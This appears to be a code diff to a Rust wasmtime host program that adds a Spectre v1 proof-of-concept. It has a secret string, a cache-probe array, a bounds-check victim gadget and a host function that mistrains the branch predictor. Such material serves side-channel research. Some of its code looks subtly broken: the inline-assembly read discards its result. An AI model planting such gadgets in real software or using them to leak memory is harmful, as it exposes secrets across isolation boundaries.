@@ -11,6 +11,48 @@ use std::io::Write;
 use wasmtime::*;
 use wasmtime_wasi::sync::WasiCtxBuilder;
 
+const STRIDE: usize = 1024;
+const PAD: usize = 160;
+
+const data_size: usize = 11;
+
+static mut public_data: [u8; PAD] = [2; PAD/*We need to pad here*/];
+
+// TODO add padding to match the cache line size
+// We need to pad the array to make cache lines aligned
+const array_for_prediction: [u8; 256 * STRIDE] = [0; 256 * STRIDE];
+const secret_data: &str = "My password";
+static mut tmp: u8 = 0;
+
+#[cfg(all(target_arch = "x86_64"))]
+fn read_memory_offset(ptr: *const u8) -> u8 {
+    let result: u8 = 0;
+    unsafe {
+        asm!(
+            "mov {result}, [{x}]",
+            x = in(reg) ptr,
+            result = out(reg_byte) _
+        );
+    };
+    result
+}
+
+#[no_mangle]
+#[allow(dead_code)]
+fn victim_code(branch_selector: usize) {
+    let secret_data_bytes = secret_data.as_bytes();
+
+    if branch_selector < data_size {
+        // tmp is mut static which means that its mutability is rule by unsafe blocks :"
+        unsafe {
+            let addr = &array_for_prediction[secret_data_bytes[branch_selector] as usize * STRIDE]
+                as *const u8;
+
+            tmp &= read_memory_offset(addr);
+        }
+    }
+}
+
 pub fn create_linker(engine: &wasmtime::Engine) -> wasmtime::Linker<wasmtime_wasi::WasiCtx> {
     let mut linker = wasmtime::Linker::new(&engine);
 
@@ -64,15 +106,29 @@ pub fn create_linker(engine: &wasmtime::Engine) -> wasmtime::Linker<wasmtime_was
         )
         .unwrap();
 
-    // TODO create a function here to syncronize atacker and victim.
     // This function does not exist in reality. We use it only to simulate a syncrhonized attack
     // We force the branch training to be syncronized when the attacker starts to measure (see
     // lines 146-154 of the spectre_wasm.rs file )
     //
     let linker = linker
-        .func_wrap("env", "sync", |_caller: wasmtime::Caller<'_, _>| {
-            println!("call sync");
-        })
+        .func_wrap(
+            "env",
+            "sync_in_host",
+            |mut caller: wasmtime::Caller<'_, _>, i: u32, malicious_x: u32| {
+                let i = i as u64;
+                // This function misstrain the branch predictor
+                let safe_index = i % data_size as u64;
+                for j in 0..100 {
+                    let location = if (j + 1) % 10 != 0 {
+                        safe_index as usize
+                    } else {
+                        malicious_x as usize
+                    };
+
+                    victim_code(location);
+                }
+            },
+        )
         .unwrap();
 
     linker.clone()
@@ -134,6 +190,26 @@ pub fn execute_wasm(path: String) {
 }
 
 pub fn main() {
+    // Setting up the data
+    unsafe {
+        public_data[0] = 1;
+        public_data[1] = 2;
+        public_data[2] = 3;
+        public_data[3] = 4;
+        public_data[4] = 5;
+        public_data[5] = 6;
+        public_data[6] = 7;
+        public_data[7] = 8;
+        public_data[8] = 9;
+        public_data[9] = 10;
+        public_data[10] = 11;
+        public_data[11] = 12;
+        public_data[12] = 13;
+        public_data[13] = 14;
+        public_data[14] = 15;
+        public_data[15] = 16;
+    }
+
     // Load the eviction binary first as the attacker an run it
     // TODO, get the binary from the command line first argument
     let args: Vec<String> = std::env::args().collect();
@@ -155,7 +231,15 @@ pub fn main() {
         std::io::stdout().flush().unwrap();
         // Flush std
         if input.trim() == "execute" {
+            println!("   Type the number of times to execute");
             let mut input = String::new();
+            // Read the next line to get the number of times to execute
+            std::io::stdin().read_line(&mut input).unwrap();
+            let inputcp = input.clone();
+            let times = inputcp.trim().parse::<u32>().unwrap();
+            println!("   Type the path of the file to execute");
+            let mut input = String::new();
+
             // Read the next line to get the filename path of the file to execute
             std::io::stdin().read_line(&mut input).unwrap();
 
@@ -164,7 +248,12 @@ pub fn main() {
             let inputcp = input.clone();
             let path = String::from(inputcp.trim());
 
-            let job = std::thread::spawn(move || execute_wasm(path));
+            let job = std::thread::spawn(move || {
+                for i in 0..times {
+                    println!("   {}", i);
+                    execute_wasm(path.clone());
+                }
+            });
             threads.push(job);
             // Launch the thread to execute
             println!("-> Executing '{}' into a separated thread", input.trim());
